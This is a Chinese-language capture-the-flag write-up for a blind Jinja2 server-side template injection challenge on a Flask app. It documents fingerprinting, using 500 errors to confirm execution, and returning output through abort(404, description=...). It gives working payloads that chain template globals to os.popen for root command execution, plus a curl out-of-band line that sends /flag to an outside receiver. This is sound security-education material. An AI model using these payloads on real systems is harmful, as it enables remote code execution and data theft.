# 极客大挑战 · klf（盲 SSTI）Writeup

| 项 | 内容 |
|---|---|
| 赛事 | 极客大挑战（SYC）。届别未确认：镜像文件时间为 2023-09，flag 前缀是 `GEEK{` 而非 `SYC{` |
| 题目 | klf（给女神表白被骂 klf） |
| 类型 | Web · Jinja2 模板注入（**盲**，输出被丢弃） |
| 时间 | 2026-10-20 13:34 → 2026-10-21 00:43（跨零点，记在 10-20） |
| 环境 | Werkzeug/2.0.3 · Python/3.6.15 · Flask 1.1.1 |
| flag | `GEEK{24f587d3-cebd-4aa3-bbcb-e35617810973}`（首实例）<br>`GEEK{bb1806f0-0c1e-4efa-88cf-79b8384fc902}`（第二实例） |
| 状态 | 已完成 |

> **每实例随机**：ctfplus 的 flag 是实例级随机的，换域名就换值。这里记两个只是留痕，方法才是重点。

## 一、这道题的真正难点

不是「认出 Jinja2 模板注入」，而是：

```
模板确实被执行了 → 但 render_template_string() 的返回值被直接丢弃 → 你看不到任何输出
```

源码长这样（拿到 RCE 之后读到的 `/app/hello/ssti/app.py`）：

```python
@app.route('/hack', methods=['GET', 'POST'])
def secr3t():
    name = request.args.get('klf', '')
    template = f'''
       <html>...<h1>%s</h1>...</html>
       '''
    render_template_string(template % name)     # ← SSTI 在这里执行
    if name:
        return render_template('klf.html')      # ← 但结果没人要，返回固定模板
    return render_template_string(template1)
```

所以整道题要解决的是**一件事**：怎么把已经执行出来的数据，从这个"只写不读"的模板里搬出来。

## 二、信息收集

### 2.1 第一条请求：看响应头定技术栈

```
GET /
Server: Werkzeug/2.0.3 Python/3.6.15
```

Werkzeug 是 Flask 的开发服务器 → 模板引擎是 Jinja2 → **优先怀疑 SSTI**。

如果 `Server` 被藏了，404 页面也是指纹：`<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">` 加 `Not Found` 是 Werkzeug 默认错误页的固定长相。

### 2.2 注释和 robots.txt 是路标

```html
<!-- 我好像藏了东西你找得到嘛klf-->
<!--/hack?-->
```

```
robots.txt:  User-agent: * / Disallow: /hack
```

两个独立来源指向 `/hack`，而且末尾那个 `?` 在暗示"这里有参数"。

### 2.3 参数名也写在明处

```
/hack 注释:  <!--klf?-->
/hack 无参数 len = 443
/hack?klf=1 len = 300
```

`klf?` 加上首页的 `/hack?`，拼起来就是 `/hack?klf=`。参数名不需要爆破。

## 三、判定：执行了，但没回显

### 3.1 教科书判据在这题失效

```
klf=abc      len=300
klf={{7*7}}  len=300
两者字节完全相同
```

如果只看这个，会得出「没注入」的错误结论。**"没回显"和"没执行"是两件事**，必须拆开。

### 3.2 换判据：看它炸不炸

```
klf={{ 1+1 }}  → 200   合法表达式
klf={{}}       → 500   非法语法
klf={{ 1/0 }}  → 500   合法语法 + 运行时异常
```

| 现象 | 唯一解释 |
|---|---|
| `{{}}` 500 | 输入被当**模板源码解析**了（普通字符串不会报错） |
| `{{ 1/0 }}` 500 | 不只解析，而是**真的执行**了（否则除零不会发生） |
| `{{ 1+1 }}` 200 | 执行成功，但结果没进响应 |

**结论：SSTI 成立，输出被丢弃。**

## 四、关键一步：用 HTTP 异常造回显

思路：模板结果没人要，但**异常信息会进响应**。Werkzeug 的 404 页面会把 `description` 原样渲染进 `<p>`。

```jinja
{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description='HELLO1')}}
```

实测响应：

```html
<title>404 Not Found</title><h1>Not Found</h1><p>HELLO1</p>
```

**通道成立。** 原理：`abort(404, ...)` 抛 `werkzeug.exceptions.NotFound`，它带 `description` 字段，Werkzeug 的默认错误页会把它写进页面正文。

### 4.1 五个等价入口（都实测可用）

```jinja
{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description='A')}}
{{lipsum['__globals__']['__builtins__']['__import__']('flask').abort(404, description='B')}}
{{cycler.__init__.__globals__.__builtins__.__import__('flask').abort(404, description='C')}}
{{url_for.__globals__['__builtins__']['__import__']('flask').abort(404, description='D')}}
{{get_flashed_messages.__globals__['__builtins__']['__import__']('flask').abort(404, description='E')}}
```

## 五、从回显到命令执行

### 5.1 两条链拼起来

```jinja
{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description=lipsum.__globals__.__builtins__.__import__('os').popen('id').read())}}
```

```
uid=0(root) gid=0(root) groups=0(root)
```

`lipsum` 出现两次不是嵌套，是**两条并列的链**：一条通到 `flask.abort`，一条通到 `os.popen`。想只写一次可以用 `{% set %}`：

```jinja
{% set G = lipsum.__globals__ %}{{G.__builtins__.__import__('flask').abort(404, description=G.os.popen('cat /app/fl4gfl4gfl4g').read())}}
```

### 5.2 找 flag 的过程（含两次失败）

```
pwd                  → /app/hello/ssti
ls -la               → app.py / requirements.txt / static / templates / thisfaklg
ls -la /             → /app /home /tmp ...
find / -iname '*flag*'   → 全是系统文件，一条都没命中（失败）
ls -laR /app         → 命中 /app/fl4gfl4gfl4g（43 字节，实例启动时刻）
cat /app/fl4gfl4gfl4g → GEEK{...}
```

**第一次失败**：文件名是 `fl4gfl4gfl4g`，把 `a` 写成了数字 `4`，`*flag*` 匹配不到。

**第二次失败**（顺手搜 flag 内容）：

```
grep -ril 'klf{' /app /tmp /root /home /var/www
```

什么都没搜到 —— 因为 flag 前缀是 `GEEK{`，不是题面里满屏的 `klf{`。**别被题面的词带偏。**

### 5.3 用时间戳和生成脚本判真伪

```
-rw-r--r-- 1 root root  43 Oct 20 05:31 fl4gfl4gfl4g    ← 实例启动时刻生成
-rw-r--r-- 1 root root 273 Sep 17  2023 Dockerfile      ← 镜像自带
-rwxr-xr-x 1 root root 123 Oct 19  2023 replace.sh
```

`replace.sh` 直接写明 flag 怎么进来的：

```sh
echo $geek_flag >>/app/fl4gfl4gfl4g
export geek_flag=not_flag
python /app/hello/ssti/app.py
```

三个诱饵：

| 位置 | 内容 |
|---|---|
| `/app/hello/ssti/thisfaklg` | `fl4g不在这哦` |
| `/app/hello/nonono` | `SYC{f4ke_f4ke_flllllllag}` |
| 环境变量 `geek_flag` | `not_flag`（被 `replace.sh` 覆盖过） |

## 六、payload 逐段拆解

```jinja
{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description=lipsum.__globals__.os.popen('ls -la ../..').read())}}
```

| 片段 | 作用 | 依据（实测） |
|---|---|---|
| `{{ }}` | Jinja 输出表达式 | `{{ 1+1 }}` → 200 |
| `lipsum` | 入口：Jinja 默认全局函数 | `lipsum.__module__` → `jinja2.utils` |
| `.__globals__` | 函数"定义模块的全局字典" | 类型是 `dict` |
| `.__builtins__` | 字典里的 builtins | `'__builtins__' in lipsum.__globals__` → True；`'builtins'` → False |
| `.__import__('flask')` | 按名字导入 flask | `__import__('flask').__name__` → `flask` |
| `.abort(404, description=…)` | 抛 404，description 进页面 | 实测 `HELLO1` 出现 |
| `.os` | 第二跳：直接从 dict 取 `os` | `lipsum.__globals__.os.__name__` → `os` |
| `.popen('ls -la ../..')` | shell 执行、接住 stdout | `popen('id').read()` → `uid=0(root)` |
| `.read()` | 取成字符串（也阻塞到命令结束） | 同上 |

**为什么第二跳能省掉 `__import__`**：`jinja2/utils.py` 顶部 `import os`，所以 `__globals__` 里直接就有 `os`。只有当模块没导入 os 时，才需要 `.__builtins__.__import__('os')`。

## 七、无回显时的四条输出通道

| 通道 | 写法 | 请求数 | 前提 |
|---|---|---|---|
| **异常回显** | `abort(404, description=数据)` | 1 | 能抛 HTTPException |
| **写静态目录** | `popen('cmd > static/x.txt')` 再访问 `/static/x.txt` | 2 | static 可写且被 web 服务 |
| **外带 OOB** | `popen('curl 接收端/?=$(cat /flag)')` | 1 | 目标能出网 |
| **时间盲注** | `{% for i in range(9000000) %}` 量耗时 | 几十~几百 | 只要能执行 |

实测时间盲注可用：900 万次循环 = 2.28 秒（基线 0.15 秒）。

**写静态那条的完整自举**（不需要 abort，也不需要事先知道绝对路径）：

```jinja
{{lipsum.__globals__.os.popen('pwd > static/o.txt').read()}}
```

```jinja
{{lipsum.__globals__.os.popen('ls -laR /app > static/o.txt').read()}}
```

然后 `GET /static/o.txt`。

## 八、踩坑表

| 坑 | 原因 | 解决 |
|---|---|---|
| 外来 WP 写 `config.class.init.globals['os']` | Markdown 把 `__class__` 渲染成**加粗 class**，复制出来下划线全没了 | 写全 `config.__class__.__init__.__globals__['os']` |
| 写成 `.builtins` | 少了两对下划线，dict 里没有这个键 | `. __builtins__`（实测 `'builtins' in globals` → False） |
| `__import__('ls -la')` | `__import__` 参数是**模块名**，不是命令 → `ModuleNotFoundError` | 执行命令用 `os.popen('ls -la')` |
| `description=os.system(...)` | `os.system` 返回**退出码数字** | 要输出必须 `popen(...).read()` |
| `{{7*7}}` 看不到 49 就以为没注入 | 输出被丢弃 | 改用 `{{}}` / `{{ 1/0 }}` 的 500 当判据 |
| `find / -iname '*flag*'` 找不到 | 文件名是 `fl4g`（数字 4） | 改按时间戳/目录结构找，或用 `*fl*g*` |
| `grep 'klf{'` 找不到 | flag 前缀是 `GEEK{` | 别拿题面里的词当前缀 |
| 相对路径 `../..` 突然不对 | 相对路径依赖 workdir | 自举时用相对，收尾用绝对 `/app/...` |
| 浏览器里贴 payload 没反应 | 双重 URL 编码 | 只编码一次；F12 看 Query String 是否已是原文 |

## 九、一句话复盘

**这题考的不是「怎么注入」，而是「没有回显时怎么把结果拿回来」。**

三种能力，按重要性排：

1. **用状态码代替回显**判断执行与否（`{{}}` 500 = 在解析，`{{ 1/0 }}` 500 = 在执行）
2. **用异常/文件系统代替响应体**当输出通道（`abort(404, description=...)` 一次请求；写 static 两次请求）
3. **用时间戳和生成脚本判断真假 flag**，而不是猜文件名和前缀

payload 的每一段都有实测依据，拼装顺序永远是：先确认入口（`lipsum`）→ 再确认取到 `os` → 再确认能执行 → 最后才加输出通道。一次只验证一环，才不会在整条链上一次错一处。

> 相关知识：[SSTI 过滤绕过方法笔记](../../logs/SSTI过滤绕过方法笔记.md)（过滤怎么绕）、[SSTILab](../靶场/SSTILab.md)（13 关过滤递进）
> 原始流水：[logs/2026-10-20.md](../../logs/2026-10-20.md)
